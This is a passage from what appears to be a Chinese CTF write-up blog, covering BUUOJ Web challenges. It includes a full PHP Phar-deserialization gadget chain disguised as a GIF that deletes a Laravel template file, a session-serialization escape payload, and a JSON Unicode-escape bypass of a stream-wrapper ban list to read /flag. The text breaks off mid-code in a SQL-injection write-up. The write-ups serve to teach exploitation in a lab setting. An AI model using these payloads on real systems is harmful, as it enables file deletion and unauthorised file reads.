看来我们可以计算模板的缓存文件名了。需要注意的是，这里的<span class=\"math inline\">\\(path用的是绝对路径。我们登录管理员账户以后note有一条提示我们用的是Apache默认配置。那么文件路径就在/var/www/html/下了。这里\\)</span>path应该是/var/www/html/resources/views/auth/flag.blade.php。sha1为73eb5933be1eb2293500f4a74b45284fd453f0bb。 所以payload为：<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Write sequence.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $sequence = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * StreamFilters.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@var</span> Swift_StreamFilter[]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> $filters = [];</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * A buffer for writing.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> $writeBuffer = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Bound streams.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@var</span> Swift_InputByteStream[]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> $mirrors = [];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Swift_ByteStream_FileByteStream</span> <span class=\"keyword\">extends</span> <span class=\"title\">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/** The internal pointer offset */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> $_offset = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** The path to the file */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> $_path;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/** The mode this file is opened in for writing */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> $_mode;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/** A lazy-loaded resource handle for reading the file */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> $_reader;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/** A lazy-loaded resource handle for writing the file */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> $_writer;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/** If magic_quotes_runtime is on, this will be true */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> $_quotes = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/** If stream is seekable true/false, or null if not known */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> $_seekable = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Create a new FileByteStream for $path.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> string $path</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> bool   $writable if true</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$path, $writable = <span class=\"literal\">false</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_path = $path;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_mode = $writable ? <span class=\"string\">&#x27;w+b&#x27;</span> : <span class=\"string\">&#x27;rb&#x27;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (function_exists(<span class=\"string\">&#x27;get_magic_quotes_runtime&#x27;</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;_quotes = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Get the complete path to the file.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> string</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getPath</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;_path;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Swift_ByteStream_TemporaryFileByteStream</span> <span class=\"keyword\">extends</span> <span class=\"title\">Swift_ByteStream_FileByteStream</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        $filePath = <span class=\"string\">&quot;/var/www/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;</span>;</span><br><span class=\"line\">        <span class=\"built_in\">parent</span>::__construct($filePath, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (file_exists(<span class=\"keyword\">$this</span>-&gt;getPath())) &#123;</span><br><span class=\"line\">            @unlink(<span class=\"keyword\">$this</span>-&gt;getPath());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> Swift_ByteStream_TemporaryFileByteStream();</span><br><span class=\"line\">$p = <span class=\"keyword\">new</span> Phar(<span class=\"string\">&#x27;./1.phar&#x27;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">$p-&gt;startBuffering();</span><br><span class=\"line\">$p-&gt;setStub(<span class=\"string\">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class=\"line\">$p-&gt;setMetadata($obj);</span><br><span class=\"line\">$p-&gt;addFromString(<span class=\"string\">&#x27;1.txt&#x27;</span>,<span class=\"string\">&#x27;text&#x27;</span>);</span><br><span class=\"line\">$p-&gt;stopBuffering();</span><br><span class=\"line\">rename(<span class=\"string\">&#x27;./1.phar&#x27;</span>, <span class=\"string\">&#x27;1.gif&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure> 上传以后check该文件，需要注意的是要添加path参数为\"phar:///var/www/html/storage/app/public/1.gif\"，提交以后模板文件就会被删除，我们访问/flag就会出现刷新以后的页面，即flag了。</p>\r\n\n    <div id=\"aplayer-MNDdKgPL\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"30951239\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{5e9a2127-047a-45f6-9772-6637a444fd8f}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web","BUUOJ","Phar","Laravel","Blade"]},{"title":"BUUOJ刷题-Web-easy_serialize_php","url":"/2019/12/03/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-serialize-php/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>安洵杯 2019的题。 打开就给了我们源码： <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$function = @$_GET[<span class=\"string\">&#x27;f&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\">$img</span>)</span>&#123;</span><br><span class=\"line\">    $filter_arr = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;flag&#x27;</span>,<span class=\"string\">&#x27;php5&#x27;</span>,<span class=\"string\">&#x27;php4&#x27;</span>,<span class=\"string\">&#x27;fl1g&#x27;</span>);</span><br><span class=\"line\">    $filter = <span class=\"string\">&#x27;/&#x27;</span>.implode(<span class=\"string\">&#x27;|&#x27;</span>,$filter_arr).<span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace($filter,<span class=\"string\">&#x27;&#x27;</span>,$img);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unset</span>($_SESSION);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$_SESSION[<span class=\"string\">&quot;user&quot;</span>] = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">$_SESSION[<span class=\"string\">&#x27;function&#x27;</span>] = $function;</span><br><span class=\"line\"></span><br><span class=\"line\">extract($_POST);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$function)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$_GET[<span class=\"string\">&#x27;img_path&#x27;</span>])&#123;</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">&#x27;img&#x27;</span>] = base64_encode(<span class=\"string\">&#x27;guest_img.png&#x27;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class=\"string\">&#x27;img_path&#x27;</span>]));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$serialize_info = filter(serialize($_SESSION));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($function == <span class=\"string\">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>($function == <span class=\"string\">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;phpinfo();&#x27;</span>); <span class=\"comment\">//maybe you can find something in here!</span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>($function == <span class=\"string\">&#x27;show_image&#x27;</span>)&#123;</span><br><span class=\"line\">    $userinfo = unserialize($serialize_info);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> file_get_contents(base64_decode($userinfo[<span class=\"string\">&#x27;img&#x27;</span>]));</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure> 代码中提示我们要去看phpinfo，发现有如下disable_functions：<code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,</code>，而且auto_append_file里有个d0g3_f1ag.php，应该就是我们的目标文件了。</p>\r\n<p>回来看源码，filter()过滤了php flag php5 php4 fllg，但是没有过滤phtml？注意到代码中一行很刺眼的<code>extract($_POST);</code>，变量覆盖？这意味着我们可以覆盖掉<span class=\"math inline\">\\(\\_SESSION了。然后filter(serialize(\\)</span>_SESSION))，如果调用函数为show_image，那么再serialize，file_get_contents序列化后的img的值。</p>\r\n<p>好了，去找一个序列化的类吧。然后发现，似乎没有，d0g3_f1ag.php没法读，那个show_image是个摆设，只能读guest_img.png。然后我们发现个问题，为什么要多此一举的来一行<code>$_SESSION['function']=$function;</code>，而且后面完全没用到？<span class=\"math inline\">\\(function是GET传参而来的，我们如何覆盖\\)</span>_SESSION都不会影响接下来的流程。只能说明$_SESSION[function]有问题。我们本地测试一下。  明显的看到，我们的_SESSION[function]原封不动的注入到序列化的结果了。这样，我们就可以任意修改serialize的结果了。</p>\r\n<img src=\"/2019/12/03/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-serialize-php/Filter-Unfilter.png\" class=\"\" title=\"序列化Session的结果\">\r\n<p>回到题目，我们的目标是什么？通过file_get_contents()去读其他文件。<span class=\"math inline\">\\(userinfo[&#39;img&#39;]由unserialize() filter过的SESSION数组来的，而我们可控这个序列化的结果，那么我们需要让\\)</span>userinfo['img']变成其他的内容，目前我们的目标是ZDBnM19mMWFnLnBocA==（d0g3_f1ag.php）。</p>\r\n<p>我们先看一下上面那张图，当_SESSION[function]赋值成123456789时序列化（未f=过滤）的结果是<code>a:2:&#123;s:8:\"function\";s:9:\"123456789\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;</code>，然后我们在123456789后面加个双引号试图截断，结果变成了：<code>a:2:&#123;s:8:\"function\";s:11:\"123456789\"\u001d\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;</code>，中间那个奇怪的符号叫分组符(0x1d)。因此，加上双引号是没法截断序列的。那咋办？</p>\r\n<p>然后我们注意到两个个问题，一是$_SESSION['user']被赋值成guest后就再也没它事了，二是filter()函数调用，是直接对序列化的结果filter，这就有可能造成序列化的结果完全改变。</p>\r\n\r\n<p>看起来似乎没什么问题，那么如果我们加入被过滤的词呢？</p>\r\n\r\n<p>然后报错了，我们来观察一下filter过后的序列化字符串：<code>a:3:&#123;s:4:\"user\";s:4:\"\";s:8:\"function\";s:7:\"123456\"\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;</code>（Base64值为YTozOntzOjQ6InVzZXIiO3M6NDoiIjtzOjg6ImZ1bmN0aW9uIjtzOjc6IjEyMzQ1NiIiO3M6MzoiaW1nIjtzOjIwOiJaM1ZsYzNSZmFXMW5MbkJ1Wnc9PSI7fQ==），user字段的值为：<code>\";s:8:\"function\";s:7:\"123456\"</code>，PHP序列化一定会以双引号作为开始结束的标志，所以，我们实际上是逃逸了一个双引号出来。</p>\r\n\r\n<p>所以，回到题目，我们最终目标是要构造出像<code>a:2:&#123;s:4:\"user\";s:12:\"flagflagflag\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;</code>这样的序列化字符串（核心是img字段内容），但是提交的时候要通过_SESSION[function]和_SESSION[user]构造出来这个字符串（直接提交_SESSION[img]没用，因为会重新覆盖成guest_img.php）。</p>\r\n<p>我们手动构造一下：首先function与user一定会出现而img是我们要的，那么把对象数变成3字符串变成：<code>a:3:&#123;s:4:\"user\";s:12:\"flagflagflag\";s:8:\"function\";s:6:\"123456\";&#125;</code>，我们自始至终可控的只有<code>123456</code>这个部分。flag会被过滤掉，变成：<code>a:3:&#123;s:4:\"user\";s:12:\"\";s:8:\"function\";s:6:\"123456\";&#125;</code>，这个时候我们会多出来一个单引号，我们在123456后面添加<code>\";</code>，字符串会变成：<code>a:3:&#123;s:4:\"user\";s:12:\"\";s:8:\"function\";s:6:\"123456\";\";&#125;</code>，user字段的值变成<code>\";s:8:\"function\";s:6:\"123456</code>，我们在后面插入自定义的img字段信息，变成：<code>a:3:&#123;s:4:\"user\";s:12:\"\";s:8:\"function\";s:6:\"123456\";s:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\"\";&#125;</code>，然后修正一下user和function的长度，变成：<code>a:3:&#123;s:4:\"user\";s:29:\"\";s:8:\"function\";s:43:\"123456\";s：3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\"\";&#125;</code>，结束了么？并没有。我们回过头看本文第一张图，在function后面，它会自动添加上<code>s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\"</code>，我们要把它屏蔽掉，否则对象数不对，很简单，加个<code>;&#125;</code>强制结束掉序列化字符串就行了，这样后面就会当做垃圾不影响结果了。最终序列化字符串长这个样子：<code>a:3:&#123;s:4:\"user\";s:29:\"\";s:8:\"function\";s:45:\"123456\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";&#125;</code>，然后有点小问题，user在这里是置空的，但是我们需要让其过滤成空，所以还要小小调整一下：<code>a:3:&#123;s:4:\"user\";s:27:\"\";s:8:\"function\";s:43:\"1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";&#125;</code>。所以我们POST <code>_SESSION[user]=phpphpphpphpphpphpphpphpphp&amp;_SESSION[function]=1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;</code>，然后本地还是没打通，为什么呢？看一下结果：<code>a:3:&#123;s:4:\"user\";s:27:\"\";s:8:\"function\";s:45:\"1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;</code>，现在的反序列化结果存在user字段，内容为<code>\";s:8:\"function\";s:45:\"1234</code>然后就是img字段了，我们强行注入结果干掉了function字段，因此我们还需要补上另一个字段。所以最后我们提交：<code>_SESSION[user]=phpphpphpphpphpphpphpphpphp&amp;_SESSION[function]=1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:1:\"1\";s:1:\"1\";&#125;</code>，本地可以打通了。</p>\r\n<p>放到BUUOJ上开题。</p>\r\n<img src=\"/2019/12/03/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-serialize-php/Read-Flag-1.png\" class=\"\" title=\"Read Flag Part 1\">\r\n<p>那就换文件读呗。</p>\r\n<img src=\"/2019/12/03/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-serialize-php/Read-Flag-2.png\" class=\"\" title=\"Read Flag Part 2\">\r\n<p>Done。</p>\r\n\n    <div id=\"aplayer-TRevJRVj\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"36703095\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{79424a28-5fda-49ec-8c16-636f2e761f1a}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web","BUUOJ"]},{"title":"BUUOJ刷题-Web-encode_and_encode","url":"/2019/10/08/BUUOJ%E5%88%B7%E9%A2%98-Web-encode-and-encode/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>打开就送源码： <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;source&#x27;</span>])) &#123;</span><br><span class=\"line\">  show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">  <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_valid</span>(<span class=\"params\">$str</span>) </span>&#123;</span><br><span class=\"line\">  $banword = [</span><br><span class=\"line\">    <span class=\"comment\">// no path traversal</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;\\.\\.&#x27;</span>,</span><br><span class=\"line\">    <span class=\"comment\">// no stream wrapper</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class=\"line\">    <span class=\"comment\">// no data exfiltration</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;flag&#x27;</span></span><br><span class=\"line\">  ];</span><br><span class=\"line\">  $regexp = <span class=\"string\">&#x27;/&#x27;</span> . implode(<span class=\"string\">&#x27;|&#x27;</span>, $banword) . <span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$body = file_get_contents(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\">$json = json_decode($body, <span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (is_valid($body) &amp;&amp; <span class=\"keyword\">isset</span>($json) &amp;&amp; <span class=\"keyword\">isset</span>($json[<span class=\"string\">&#x27;page&#x27;</span>])) &#123;</span><br><span class=\"line\">  $page = $json[<span class=\"string\">&#x27;page&#x27;</span>];</span><br><span class=\"line\">  $content = file_get_contents($page);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class=\"line\">    $content = <span class=\"string\">&quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  $content = <span class=\"string\">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// no data exfiltration!!!</span></span><br><span class=\"line\">$content = preg_replace(<span class=\"string\">&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;</span>, <span class=\"string\">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> json_encode([<span class=\"string\">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure></p>\r\n<p>is_valid()Ban了几个关键词：flag php file glob data tp zip zlib phar和..，这样我们没法用PHP流读文件了。然后它从php://input读内容，我们直接POST就可以了。我们POST的内容要是JSON，他会读page的项，如果返回内容不符合is_valid()或者没有内容就会返回not found，其他错误就返回invlaid request，然后把返回的内容中如果有HarekazeCTF{}，就把花括号中的内容删掉，最后返回结果。</p>\r\n<p>正常情况下是没办法绕过is_valid()的，但是他提交的是JSON。JSON具有很强的包容性，能够接收Unicode，因此我们可以用Unicode编码字符去绕过。</p>\r\n<p>根据所给的Dockerfile我们可以知道flag在根目录下。提交<code>&#123;\"page\":\"/fl\\u0061g\"&#125;</code>（a的Unicode编码是U+0061），返回not found，因为/flag包含flag字符串，没通过is_valid()。同样的，用php流就可以了，提交<code>&#123;\"page\":\"ph\\u0070\\u003a//filter/convert.base64-encode/resource=/fl\\u0061g\"&#125;</code>，返回Base64编码过的flag。反Base64就可以了。</p>\r\n\n    <div id=\"aplayer-PiarIHnU\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"17423740\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{c51380a7-35c7-4a81-9e84-486421da5c27}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","BUUOJ","Unicode","JSON"]},{"title":"BUUOJ刷题-Web-shellshellshell","url":"/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>De1CTF 2019的Shellshellshell。</p>\r\n<p>扫目录发现有index.php~文件，然后猜测一下其他文件也有，然后我们就Down下了完整源码。 <a id=\"more\"></a> # Part 1. SQL Injection</p>\r\n<p>看一下源码，发现在user.php里的publish()有个奇怪的insert:</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">publish</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"keyword\">$this</span>-&gt;check_login()) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;is_admin == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;signature&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;mood&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                $mood = addslashes(serialize(<span class=\"keyword\">new</span> Mood((<span class=\"keyword\">int</span>)$_POST[<span class=\"string\">&#x27;mood&#x27;</span>],get_ip())));</span><br><span class=\"line\">                $db = <span class=\"keyword\">new</span> Db();</span><br><span class=\"line\">                @$ret = $db-&gt;insert(<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;userid&#x27;</span>,<span class=\"string\">&#x27;username&#x27;</span>,<span class=\"string\">&#x27;signature&#x27;</span>,<span class=\"string\">&#x27;mood&#x27;</span>),<span class=\"string\">&#x27;ctf_user_signature&#x27;</span>,<span class=\"keyword\">array</span>(<span class=\"keyword\">$this</span>-&gt;userid,<span class=\"keyword\">$this</span>-&gt;username,$_POST[<span class=\"string\">&#x27;signature&#x27;</span>],$mood));</span><br><span class=\"line\">                <span class=\"keyword\">if</span>($ret)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">                <span class=\"keyword\">else</span></span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\r\n<p>直接带入<span class=\"math inline\">\\(\\_POST[&#39;signature&#39;]，那么来看一下\\)</span>db-&gt;insert的实现。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_column</span>(<span class=\"params\">$columns</span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(is_array($columns))</span><br><span class=\"line\">        $column = <span class=\"string\">&#x27; `&#x27;</span>.implode(<span class=\"string\">&#x27;`,`&#x27;</span>,$columns).<span class=\"string\">&#x27;` &#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        $column = <span class=\"string\">&#x27; `&#x27;</span>.$columns.<span class=\"string\">&#x27;` &#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> $column;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">insert</span>(<span 